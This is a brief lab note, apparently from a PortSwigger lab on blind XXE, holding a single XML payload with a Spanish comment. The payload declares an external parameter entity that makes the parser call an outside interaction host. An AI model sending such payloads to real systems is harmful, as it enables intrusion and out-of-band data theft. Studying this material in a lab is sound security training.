Tags: #XXE #PortSwigger 

# Lab 4 Blind XXE with out-of-band interaction via XML parameter entities

```xml 
<!-- Por si no nos dejan colocar entidades, tendriamos que hacerlo en el DOCTYPE -->

<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://1acdc5ay0qrwik98y.otify.com"> %xxe; ]>      
	<root>
		root
	</root>
```

